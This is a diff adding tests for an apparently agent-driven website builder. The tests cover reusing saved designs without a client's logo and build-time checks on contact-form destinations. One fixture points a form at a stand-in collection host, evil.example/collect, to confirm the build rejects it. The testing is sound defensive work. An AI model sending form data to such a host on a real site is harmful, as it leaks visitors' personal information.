@@ -223,3 +223,63 @@ describe("failure messages", () => {
     expect(failureText(undefined, "error_max_turns")).toMatch(/adım sınırı/);
   });
 });
+
+describe("design library", () => {
+  it("saves a design without the client's logo, starts another client from it, and fails while the source's facts remain", async () => {
+    const { f } = await customClient();
+    writeGoodSite(f);
+    const lib = await import("../src/panel/library.js");
+    const meta = lib.saveToLibrary(f, SLUG, { name: "Kavanoz düzeni", tags: ["sıcak"] });
+    expect(meta.id).toBe("kavanoz-duzeni");
+    expect(meta.forbidden).toContain("Willow & Thread");
+    expect(meta.forbidden).toContain("hello@willow.co.uk");
+    expect(lib.listLibrary(f)[0]!.palette.brine).toBe("#2F4A2A");
+    const { existsSync } = await import("node:fs");
+    const path = await import("node:path");
+    expect(existsSync(path.join(f.clientsRoot, "_library", meta.id, "site", "brand", "logo.svg"))).toBe(false);
+    expect(tools.listClients(f).clients.map((c) => c.slug)).not.toContain("_library");
+
+    await tools.createClient(f, { slug: "other-shop", businessName: "Other Shop", industry: "pickle shop", hostingModel: "managed", template: "custom" });
+    tools.updateClientConfig(f, { slug: "other-shop", patch: COMPLETE_PATCH });
+    tools.saveContent(f, { slug: "other-shop", locale: "en", content: COMPLETE_CONTENT });
+    expect(() => lib.applyLibraryDesign(f, SLUG, meta.id)).toThrow(/zaten/);
+    lib.applyLibraryDesign(f, "other-shop", meta.id);
+    const w = (p: string, c: string) => tools.writeSiteFileTool(f, { slug: "other-shop", path: p, content: c });
+    w("brand/logo.svg", '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><circle cx="5" cy="5" r="4" fill="#2F4A2A"/></svg>');
+    let r = await tools.buildSite(f, { slug: "other-shop" });
+    const left = () => r.checks.find((c) => c.name.startsWith("Library design"));
+    expect(left()?.status).toBe("fail");
+    expect(left()?.detail).toMatch(/Willow/);
+    for (const p of ["index.html", "contact/index.html", "404.html"]) {
+      const content = tools.readSiteFileTool(f, { slug: "other-shop", path: p }).content.replaceAll("Willow &amp; Thread", "Other Shop").replaceAll("Willow & Thread", "Other Shop");
+      w(p, content);
+    }
+    r = await tools.buildSite(f, { slug: "other-shop" });
+    expect(left()?.status).toBe("pass");
+    lib.deleteFromLibrary(f, meta.id);
+    expect(lib.listLibrary(f)).toEqual([]);
+  });
+});
+
+describe("contact form per client", () => {
+  it("accepts only the form address Eren set (from .factory), and tells the agent", async () => {
+    const { f, paths } = await customClient();
+    writeGoodSite(f);
+    const { writeFileSync, mkdirSync } = await import("node:fs");
+    const path = await import("node:path");
+    const formPage = (action: string) => page("Contact | Willow & Thread", `<h1>Contact</h1><form action="${action}" method="POST"><label>E-mail <input name="email" type="email"></label><button>Send</button></form>`);
+    tools.writeSiteFileTool(f, { slug: SLUG, path: "contact/index.html", content: formPage("https://formspree.io/f/abcd1234") });
+    let r = await tools.buildSite(f, { slug: SLUG });
+    expect(r.checks.find((c) => c.name.startsWith("Custom code safety"))?.status).toBe("fail");
+    mkdirSync(paths.factoryDir, { recursive: true });
+    writeFileSync(path.join(paths.factoryDir, "form.json"), JSON.stringify({ action: "https://formspree.io/f/abcd1234" }));
+    expect(tools.getClientStatus(f, { slug: SLUG }).contactForm).toEqual({ action: "https://formspree.io/f/abcd1234" });
+    r = await tools.buildSite(f, { slug: SLUG });
+    expect(r.checks.find((c) => c.name.startsWith("Custom code safety"))?.status).toBe("pass");
+    tools.writeSiteFileTool(f, { slug: SLUG, path: "contact/index.html", content: formPage("https://evil.example/collect") });
+    r = await tools.buildSite(f, { slug: SLUG });
+    expect(r.checks.find((c) => c.name.startsWith("Custom code safety"))?.status).toBe("fail");
+    writeFileSync(path.join(paths.factoryDir, "form.json"), JSON.stringify({ action: "https://evil.example/collect" }));
+    expect(tools.getClientStatus(f, { slug: SLUG }).contactForm).toBeNull();
+  });
+});
